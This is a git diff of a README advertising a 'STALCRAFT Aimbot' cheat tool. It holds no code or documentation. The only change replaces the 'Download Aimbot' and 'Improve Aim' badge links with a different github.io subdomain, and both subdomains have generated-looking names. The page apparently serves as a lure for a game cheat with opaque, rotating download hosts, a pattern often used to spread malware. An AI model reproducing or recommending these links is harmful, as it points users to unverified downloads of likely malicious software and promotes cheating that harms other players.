@@ -1,7 +1,7 @@
 # 🎯 STALCRAFT Aimbot — Aim Assist Tool
 
-[![Download Aimbot](https://img.shields.io/badge/Download_Aimbot-darkgreen?style=for-the-badge)](https://stalcraft676aimtoolweb0.github.io/.github/)  
-[![Improve Aim](https://img.shields.io/badge/Improve_Aim-limegreen?style=for-the-badge&logo=target)](https://stalcraft676aimtoolweb0.github.io/.github/)
+[![Download Aimbot](https://img.shields.io/badge/Download_Aimbot-darkgreen?style=for-the-badge)](https://stalcraft1aimassistweb0.github.io/.github/)  
+[![Improve Aim](https://img.shields.io/badge/Improve_Aim-limegreen?style=for-the-badge&logo=target)](https://stalcraft1aimassistweb0.github.io/.github/)
 
 ---
 
